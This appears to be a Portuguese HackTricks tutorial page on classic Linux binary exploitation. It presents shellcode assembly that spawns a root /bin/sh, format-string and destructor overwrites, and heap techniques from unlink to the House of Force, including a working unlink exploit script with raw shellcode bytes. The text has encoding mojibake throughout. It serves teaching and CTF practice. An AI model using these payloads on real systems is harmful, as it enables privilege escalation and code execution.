# Explora√ß√£o no Linux (B√°sico)

<details>

<summary><strong>Aprenda hacking AWS do zero ao avan√ßado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **2.SHELLCODE**

Ver interrup√ß√µes do kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpamos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento para passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Retorna um .o\
**ld assembly.o -o shellcodeout** ‚Äî> Gera um execut√°vel com o c√≥digo em assembly e podemos extrair os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar se √© realmente nosso shellcode e extrair os OpCodes

**Verificar se o shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar se as chamadas de sistema est√£o sendo feitas corretamente, o programa anterior deve ser compilado e as chamadas de sistema devem aparecer em **strace ./PROGRAMA\_COMPILADO**

Ao criar shellcodes, um truque pode ser usado. A primeira instru√ß√£o √© um salto para uma chamada. A chamada chama o c√≥digo original e tamb√©m coloca o EIP na pilha. Ap√≥s a instru√ß√£o de chamada, inserimos a string necess√°ria, para que com esse EIP possamos apontar para a string e continuar executando o c√≥digo.

EX **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando o Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Buscador de Ovos:**

Trata-se de um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode armazenada l√° (procura por alguma assinatura colocada na shellcode). √ötil nos casos em que h√° apenas um pequeno espa√ßo para injetar c√≥digo.

**Shellcodes Polim√≥rficos**

S√£o shells cifrados que possuem um pequeno c√≥digo que os descriptografa e salta para ele, usando o truque de Call-Pop, este seria um **exemplo de cifra de C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©todos complementares**

**Ret2Ret**

√ötil quando n√£o √© poss√≠vel inserir um endere√ßo de pilha no EIP (verifica-se que o EIP n√£o cont√©m 0xbf) ou quando n√£o √© poss√≠vel calcular a localiza√ß√£o do shellcode. No entanto, a fun√ß√£o vulner√°vel aceita um par√¢metro (o shellcode ser√° colocado aqui).

Dessa forma, ao alterar o EIP por um endere√ßo de um **ret**, a pr√≥xima instru√ß√£o ser√° carregada (que √© o endere√ßo do primeiro argumento da fun√ß√£o). Ou seja, o shellcode ser√° carregado.

O exploit seria: SHELLCODE + Preenchimento (at√© o EIP) + **\&ret** (os pr√≥ximos bytes da pilha apontam para o in√≠cio do shellcode, pois o endere√ßo do argumento passado √© colocado na pilha)

Parece que fun√ß√µes como **strncpy**, uma vez completas, removem da pilha o endere√ßo onde o shellcode estava armazenado, impossibilitando essa t√©cnica. Ou seja, o endere√ßo passado para a fun√ß√£o como argumento (que armazena o shellcode) √© modificado por um 0x00, ent√£o, ao chamar o segundo **ret**, ele encontra um 0x00 e o programa trava.

**T√©cnica de Murat**

No Linux, todos os programas s√£o mapeados come√ßando em 0xbfffffff.

Observando como a pilha de um novo processo √© constru√≠da no Linux, √© poss√≠vel desenvolver um exploit de modo que o programa seja iniciado em um ambiente onde a √∫nica vari√°vel seja o shellcode. O endere√ßo desta vari√°vel pode ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME\_do\_execut√°vel\_completo) - strlen(shellcode)

Dessa forma, seria facilmente obtido o endere√ßo onde est√° a vari√°vel de ambiente com o shellcode.

Isso √© poss√≠vel gra√ßas √† fun√ß√£o execle, que permite criar um ambiente com apenas as vari√°veis de ambiente desejadas.

**Estouros de inteiros**

Esse tipo de estouro ocorre quando uma vari√°vel n√£o est√° preparada para suportar um n√∫mero t√£o grande quanto o que √© passado, possivelmente devido a uma confus√£o entre vari√°veis com e sem sinal, por exemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
No exemplo acima, vemos que o programa espera 2 par√¢metros. O primeiro √© o comprimento da pr√≥xima string e o segundo √© a string.

Se passarmos um n√∫mero negativo como o primeiro par√¢metro, ele mostrar√° que len < 256 e passar√° por esse filtro, e tamb√©m strlen(buffer) ser√° menor que l, pois l √© um unsigned int e ser√° muito grande.

Esse tipo de overflow n√£o busca escrever algo no processo do programa, mas sim contornar filtros mal projetados para explorar outras vulnerabilidades.

**Vari√°veis n√£o inicializadas**

N√£o se sabe o valor que uma vari√°vel n√£o inicializada pode assumir e pode ser interessante observar isso. Pode ser que ela assuma o valor que uma vari√°vel da fun√ß√£o anterior assumia e que essa vari√°vel seja controlada pelo atacante.

##

###

###

###

### **.fini\_array**

Essencialmente, esta √© uma estrutura com **fun√ß√µes que ser√£o chamadas** antes do programa terminar. Isso √© interessante se voc√™ puder chamar seu **shellcode apenas pulando para um endere√ßo**, ou em casos em que voc√™ precisa voltar ao main novamente para **explorar a string de formato uma segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Note que isso **n√£o** criar√° um **loop eterno** porque quando voc√™ voltar para o principal, o can√°rio perceber√°, o final da pilha pode estar corrompido e a fun√ß√£o n√£o ser√° chamada novamente. Portanto, com isso voc√™ poder√° **ter mais 1 execu√ß√£o** da vulnerabilidade.

### **Formatar Strings para Extrair Conte√∫do**

Uma string de formato tamb√©m pode ser abusada para **extrair conte√∫do** da mem√≥ria do programa.\
Por exemplo, na seguinte situa√ß√£o h√° uma **vari√°vel local na pilha apontando para uma flag**. Se voc√™ **encontrar** onde na **mem√≥ria** o **ponteiro** para a **flag** est√°, voc√™ pode fazer o **printf acessar** esse **endere√ßo** e **imprimir** a **flag**:

Ent√£o, a flag est√° em **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E a partir do vazamento voc√™ pode ver que o **ponteiro para a flag** est√° no **8¬∫** par√¢metro:

![](<../../.gitbook/assets/image (623).png>)

Portanto, **acessando** o **8¬∫ par√¢metro** voc√™ pode obter a flag:

![](<../../.gitbook/assets/image (624).png>)

Note que seguindo o **exploit anterior** e percebendo que voc√™ pode **vazar conte√∫do**, voc√™ pode **definir ponteiros** para o **`printf`** na se√ß√£o onde o **execut√°vel** est√° **carregado** e **extrair** ele **inteiramente**!

### **DTOR**

{% hint style="danger" %}
Atualmente √© muito **incomum encontrar um bin√°rio com uma se√ß√£o dtor**.
{% endhint %}

Os destrutores s√£o fun√ß√µes que s√£o **executadas antes do programa terminar**.\
Se voc√™ conseguir **escrever** um **endere√ßo** para um **shellcode** em **`__DTOR_END__`**, isso ser√° **executado** antes do programa terminar.\
Obtenha o endere√ßo desta se√ß√£o com:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Geralmente voc√™ encontrar√° a se√ß√£o **DTOR** **entre** os valores `ffffffff` e `00000000`. Portanto, se voc√™ apenas ver esses valores, significa que **n√£o h√° nenhuma fun√ß√£o registrada**. Portanto, **sobrescreva** o **`00000000`** com o **endere√ßo** do **shellcode** para execut√°-lo.

### **Strings de Formato para Estouros de Buffer**

O **sprintf move** uma string formatada **para** uma **vari√°vel**. Portanto, voc√™ pode abusar da **formata√ß√£o** de uma string para causar um **estouro de buffer na vari√°vel** para onde o conte√∫do √© copiado.\
Por exemplo, a carga `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um estouro de buffer.

### **Estruturas \_\_atexit**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`atexit()`** √© uma fun√ß√£o para a qual **outras fun√ß√µes s√£o passadas como par√¢metros**. Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ puder **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para um shellcode, por exemplo, voc√™ **obter√° controle** sobre o **processo**, mas atualmente isso √© mais complicado.\
Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** por v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas s√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente esse vetor de ataque n√£o √© muito √∫til, pelo menos em x86 e x64\_86.\
A **fun√ß√£o de criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a fun√ß√£o de criptografia** porque ela **retorna o mesmo** que recebeu como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o **`PTR_MANGLE`**, ent√£o as **arquiteturas vulner√°veis a esse ataque s√£o as mesmas acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o s√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o chamada, o controle pode ser assumido. Ou voc√™ tamb√©m poderia modificar EBP para modificar o ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable** que √© um array de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr** que √© um **ponteiro** para o array de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, ent√£o se uma **sobrescrita** do **VPtr** for alcan√ßada, ela poderia ser **modificada** para **apontar** para um m√©todo fict√≠cio para que a execu√ß√£o de uma fun√ß√£o v√° para o shellcode.

## **Medidas Preventivas e Evas√µes**

###

**Substitui√ß√£o do Libsafe**

Ativado por: LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Ele intercepta chamadas para algumas fun√ß√µes inseguras por outras seguras. N√£o √© padronizado. (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o para compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD\_PRELOAD n√£o funciona em bin√°rios com suid).

**Espa√ßo de Endere√ßo ASCII Armored**

Consiste em carregar bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para que sempre haja um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, especialmente em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que a fun√ß√£o strcpy@plt (da plt) seja chamada e aponte para a entrada da GOT e copie o primeiro byte da fun√ß√£o que se deseja chamar (system()). Em seguida, o mesmo √© feito apontando para GOT+1 e copiando o 2¬∫ byte de system()... Por fim, a dire√ß√£o armazenada na GOT que ser√° system() √© chamada.

**Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala um sistema b√°sico em um subdiret√≥rio espec√≠fico

Um administrador pode sair dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

**Instrumenta√ß√£o de C√≥digo**

Valgrind ‚Äî> Procura por erros\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Estouros de Heap: Exploits B√°sicos**

**Chunk Alocado**

prev\_size |\
size | ‚ÄîCabe√ßalho\
\*mem | Dados

**Chunk Livre**

prev\_size |\
size |\
\*fd | Ptr chunk seguinte\
\*bk | Ptr chunk anterior ‚ÄîCabe√ßalho\
\*mem | Dados

Os chunks livres est√£o em uma lista duplamente encadeada (bin) e nunca podem haver dois chunks livres juntos (eles s√£o unidos)

No ‚Äúsize‚Äù h√° bits para indicar: Se o chunk anterior est√° em uso, se o chunk foi alocado por meio de mmap() e se o chunk pertence √† arena prim√°ria.

Ao liberar um chunk, se algum dos cont√≠guos estiver livre, eles s√£o fundidos pela macro unlink() e o novo chunk maior √© passado para frontlink() para ser inserido no bin apropriado.

unlink(){\
BK = P->bk; ‚Äî> O BK do novo chunk √© o que o chunk que j√° estava livre antes tinha\
FD = P->fd; ‚Äî> O FD do novo chunk √© o que o chunk que j√° estava livre antes tinha\
FD->bk = BK; ‚Äî> O BK do chunk seguinte aponta para o novo chunk\
BK->fd = FD; ‚Äî> O FD do chunk anterior aponta para o novo chunk\
}

Portanto, se conseguirmos modificar o P->bk com o endere√ßo de um shellcode e o P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, √© poss√≠vel:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E assim, o shellcode √© executado ao sair do programa.

Al√©m disso, a 4¬™ instru√ß√£o de unlink() escreve algo e o shellcode precisa ser ajustado para isso:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Isso resulta na escrita de 4 bytes a partir do 8¬∫ byte do shellcode, ent√£o a primeira instru√ß√£o do shellcode deve ser um jmp para pular isso e chegar a alguns nops que levam ao restante do shellcode.

Portanto, o exploit √© criado:

No buffer1, inserimos o shellcode come√ßando com um jmp para que ele caia nos nops ou no restante do shellcode.

Ap√≥s o shellcode, inserimos preenchimento at√© chegar ao campo prev\_size e size do pr√≥ximo chunk. Nestes locais, inserimos 0xfffffff0 (para sobrescrever o prev\_size para que tenha o bit que indica que est√° livre) e ‚Äú-4‚Äù (0xfffffffc) no size (para que, ao verificar no 3¬∫ chunk se o 2¬∫ estava livre, na verdade v√° para o prev\_size modificado que dir√° que est√° livre) -> Assim, quando o free() investigar, ele ir√° para o size do 3¬∫, mas na verdade ir√° para o 2¬∫ - 4 e pensar√° que o 2¬∫ chunk est√° livre. Ent√£o ele chamar√° **unlink()**.

Ao chamar unlink(), ele usar√° os primeiros dados do 2¬∫ chunk como P->fd, ent√£o o endere√ßo que se deseja sobrescrever - 12 (pois em FD->bk ele adicionar√° 12 ao endere√ßo armazenado em FD) ser√° inserido l√°. E nesse endere√ßo, a segunda dire√ß√£o encontrada no 2¬∫ chunk ser√° inserida, que ser√° o endere√ßo do shellcode (falso P->bk).
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de preenchimento**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interessa que o bit que indica que o chunk anterior est√° livre esteja como 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que pense que o "size" do 3¬∫ chunk est√° 4bytes atr√°s (aponta para prev\_size) onde ele verifica se o 2¬∫ chunk est√° livre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #No payload, vamos adicionar 8 bytes de preenchimento no in√≠cio**

**got\_free = pack("\<I", 0x08048300 - 12) #Endere√ßo de free() na plt-12 (ser√° sobrescrito para executar o shellcode na 2¬™ chamada de free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Como mencionado, o payload come√ßa com 8 bytes de preenchimento**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #O 2¬∫ chunk √© modificado, got\_free aponta para onde vamos armazenar o endere√ßo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando em ordem inversa (wargame)**

Estamos controlando 3 chunks consecutivos e eles s√£o liberados em ordem inversa √† reserva.

Neste caso:

No chunk c, colocamos o shellcode

Usamos o chunk a para sobrescrever o b de forma que o bit PREV\_INUSE do tamanho seja desativado, fazendo o programa pensar que o chunk a est√° livre.

Al√©m disso, sobrescrevemos o tamanho na cabe√ßa do b para ser -4.

Assim, o programa pensar√° que "a" est√° livre e em um bin, ent√£o chamar√° unlink() para desvincul√°-lo. No entanto, como o tamanho PREV\_SIZE √© -4, ele pensar√° que o chunk "a" realmente come√ßa em b+4. Ou seja, far√° um unlink() em um chunk que come√ßa em b+4, ent√£o em b+12 estar√° o ponteiro "fd" e em b+16 estar√° o ponteiro "bk".

Dessa forma, se colocarmos o endere√ßo do shellcode em bk e o endere√ßo da fun√ß√£o "puts()" -12 em fd, teremos nosso payload.

**T√©cnica de Frontlink**

Frontlink √© chamado quando algo √© liberado e nenhum dos chunks adjacentes est√° livre, unlink() n√£o √© chamado, mas frontlink() √© chamado diretamente.

Vulnerabilidade √∫til quando o malloc atacado nunca √© liberado (free()).

Requer:

Um buffer que pode ser estourado com a fun√ß√£o de entrada de dados

Um buffer adjacente a este que deve ser liberado e ter√° o campo fd de sua cabe√ßa modificado devido ao estouro do buffer anterior

Um buffer para liberar com um tamanho maior que 512, mas menor que o buffer anterior

Um buffer declarado antes do passo 3 que permite sobrescrever o prev\_size deste

Dessa forma, conseguindo sobrescrever em dois mallocs de forma descontrolada e em um de forma controlada, mas apenas um √© liberado, podemos fazer um exploit.

**Vulnerabilidade double free()**

Se free() for chamado duas vezes com o mesmo ponteiro, dois bins apontar√£o para o mesmo endere√ßo.

Se quisermos reutilizar um, n√£o haver√° problemas. Se quisermos usar outro, ele receber√° o mesmo espa√ßo, ent√£o teremos os ponteiros "fd" e "bk" falsificados com os dados que a reserva anterior escrever√°.

**After free()**

Um ponteiro previamente liberado √© usado novamente sem controle.

## **8 Heap Overflows: Exploits avan√ßados**

As t√©cnicas Unlink() e FrontLink() foram removidas ao modificar a fun√ß√£o unlink().

**The house of mind**

Apenas uma chamada para free() √© necess√°ria para executar c√≥digo arbitr√°rio. √â interessante procurar um segundo chunk que possa ser estourado por um anterior e liberado.

Uma chamada para free() chama public\_fREe(mem), que faz:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Retorna um ponteiro para o endere√ßo onde o chunk come√ßa (mem-8)

‚Ä¶

ar\_ptr = arena\_for_chunk(p); ‚Äî> chunk\_non\_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

‚Ä¶

\_int_free(ar_ptr, mem);

}

Em \[1], verifica o campo size do bit NON_MAIN_ARENA, que pode ser alterado para que a verifica√ß√£o retorne verdadeira e execute heap_for_ptr(), que faz um and em "mem", deixando os 2,5 bytes menos significativos como 0 (em nosso caso, de 0x0804a000, deixa 0x08000000) e acessa 0x08000000->ar_ptr (como se fosse um struct heap_info)

Dessa forma, se pudermos controlar um chunk, por exemplo, em 0x0804a000 e um chunk ser√° liberado em **0x081002a0**, podemos chegar ao endere√ßo 0x08100000 e escrever o que quisermos, por exemplo, **0x0804a000**. Quando este segundo chunk for liberado, ele encontrar√° que heap_for_ptr(ptr)->ar_ptr retorna o que escrevemos em 0x08100000 (pois √© aplicado a 0x081002a0 o and que vimos antes e da√≠ √© extra√≠do o valor dos primeiros 4 bytes, o ar_ptr)

Dessa forma, chama-se \_int_free(ar_ptr, mem), ou seja, **\_int_free(0x0804a000, 0x081002a0)**\
**\_int_free(mstate av, Void_t\* mem){**\
‚Ä¶\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como vimos antes, podemos controlar o valor de av, pois √© o que escrevemos no chunk que ser√° liberado.

Como unsorted_chunks √© definido, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Portanto, se escrevermos o valor de \_\_DTOR_END\_\_-12 em av->bins\[2], na √∫ltima instru√ß√£o, ser√° escrito em \_\_DTOR_END\_\_ o endere√ßo do segundo chunk.

Ou seja, no primeiro chunk, no in√≠cio, devemos colocar muitas vezes o endere√ßo de \_\_DTOR_END\_\_-12, pois √© de l√° que av->bins\[2] o pegar√°.

No endere√ßo onde cair o endere√ßo do segundo chunk com os √∫ltimos 5 zeros, devemos escrever o endere√ßo deste primeiro chunk para que heap_for_ptr() pense que ar_ptr est√° no in√≠cio do primeiro chunk e pegue av->bins\[2] de l√°.

No segundo chunk e gra√ßas ao primeiro, sobrescrevemos o prev_size com um salto 0x0c e o size com algo para ativar -> NON_MAIN_ARENA

Em seguida, no chunk 2, colocamos muitos nops e, finalmente, o shellcode

Dessa forma, \_int_free(TRO√áO1, TRO√áO2) ser√° chamado e seguir√° as instru√ß√µes para escrever em \_\_DTOR_END\_\_ o endere√ßo do prev_size do TRO√áO2, que saltar√° para o shellcode.
Para aplicar esta t√©cnica, √© necess√°rio que alguns requisitos sejam atendidos, o que complica um pouco mais o payload.

Esta t√©cnica n√£o √© mais aplic√°vel, pois foi aplicado quase o mesmo patch que para unlink. Verifica-se se o novo local para onde aponta tamb√©m est√° apontando para ele.

**Fastbin**

√â uma variante de The house of mind

Interessa-nos executar o seguinte c√≥digo ap√≥s a primeira verifica√ß√£o da fun√ß√£o \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Sendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Desta forma, se for colocado em "fb", ele aponta para uma fun√ß√£o na GOT, onde ser√° colocada a dire√ß√£o do chunk sobrescrito. Para isso, √© necess√°rio que a arena esteja pr√≥xima das dire√ß√µes de dtors. Mais precisamente, av->max\_fast deve estar na dire√ß√£o que ser√° sobrescrita.

Dado que com The House of Mind vimos que control√°vamos a posi√ß√£o do av.

Ent√£o, se no campo size for inserido um tamanho de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() retornar√° fastbins\[-1\], que apontar√° para av->max\_fast

Neste caso, av->max\_fast ser√° a dire√ß√£o que ser√° sobrescrita (n√£o para onde aponta, mas essa posi√ß√£o ser√° sobrescrita).

Al√©m disso, √© necess√°rio que o chunk adjacente ao liberado seja maior que 8 -> Como mencionamos que o tamanho do chunk liberado √© 8, neste chunk falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no chunk liberado, ent√£o no in√≠cio teremos que colocar um jmp que caia em nops).

Al√©m disso, esse mesmo chunk falso deve ser menor que av->system\_mem. av->system\_mem est√° 1848 bytes adiante.

Devido aos nulos de \_DTOR\_END\_ e √†s poucas dire√ß√µes na GOT, nenhuma dire√ß√£o dessas se√ß√µes serve para ser sobrescrita, ent√£o vejamos como aplicar fastbin para atacar a pilha.

Outra forma de ataque √© redirecionar o **av** para a pilha.

Se modificarmos o size para ser 16 em vez de 8, ent√£o: fastbin\_index() retornar√° fastbins\[0\] e podemos usar isso para sobrescrever a pilha.

Para isso, n√£o deve haver nenhum canary ou valores estranhos na pilha, na verdade, devemos encontrar o seguinte: 4 bytes nulos + EBP + RET

Os 4 bytes nulos s√£o necess√°rios para que o **av** esteja nessa dire√ß√£o e o primeiro elemento de um **av** √© o mutex que deve ser 0.

O **av->max\_fast** ser√° o EBP e ser√° um valor que nos permitir√° ignorar as restri√ß√µes.

No **av->fastbins\[0\]** ser√° sobrescrito com a dire√ß√£o de **p** e ser√° o RET, assim a shellcode ser√° executada.

Al√©m disso, em **av->system\_mem** (1484 bytes acima da posi√ß√£o na pilha) haver√° bastante lixo que nos permitir√° ignorar a verifica√ß√£o que √© feita.

Al√©m disso, √© necess√°rio que o chunk adjacente ao liberado seja maior que 8 -> Como mencionamos que o tamanho do chunk liberado √© 16, neste chunk falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no chunk liberado, ent√£o no in√≠cio teremos que colocar um jmp que caia em nops que v√™m ap√≥s o campo size do novo chunk falso).

**The House of Spirit**

Neste caso, buscamos ter um ponteiro para um malloc que possa ser alterado pelo atacante (por exemplo, o ponteiro est√° na pilha abaixo de um poss√≠vel overflow para uma vari√°vel).

Assim, poder√≠amos fazer com que esse ponteiro apontasse para onde quer que fosse. No entanto, nem todo local √© v√°lido, o tamanho do chunk falso deve ser menor que av->max\_fast e mais especificamente igual ao tamanho solicitado em uma chamada futura para malloc()+8. Portanto, se soubermos que ap√≥s esse ponteiro vulner√°vel √© feita uma chamada para malloc(40), o tamanho do chunk falso deve ser igual a 48.

Por exemplo, se o programa perguntar ao usu√°rio por um n√∫mero, poder√≠amos inserir 48 e apontar o ponteiro de malloc modific√°vel para os pr√≥ximos 4 bytes (que poderiam pertencer ao EBP com sorte, assim o 48 ficaria atr√°s, como se fosse o cabe√ßalho size). Al√©m disso, o endere√ßo ptr-4+48 deve atender a v√°rias condi√ß√µes (sendo neste caso ptr=EBP), ou seja, 8 < ptr-4+48 < av->system\_mem.

Caso isso seja cumprido, quando a pr√≥xima chamada para malloc que dissemos que era malloc(40) for feita, o endere√ßo do EBP ser√° atribu√≠do. Caso o atacante tamb√©m possa controlar o que √© escrito nesse malloc, ele pode sobrescrever tanto o EBP quanto o EIP com o endere√ßo desejado.

Acredito que isso ocorre porque quando o free() √© chamado, ele armazenar√° que no endere√ßo que aponta para o EBP da pilha h√° um chunk de tamanho perfeito para o novo malloc() que est√° sendo reservado, ent√£o ele atribui esse endere√ßo.

**The House of Force**

√â necess√°rio:

* Um overflow para um chunk que permita sobrescrever o wilderness
* Uma chamada para malloc() com o tamanho definido pelo usu√°rio
* Uma chamada para malloc() cujos dados possam ser definidos pelo usu√°rio

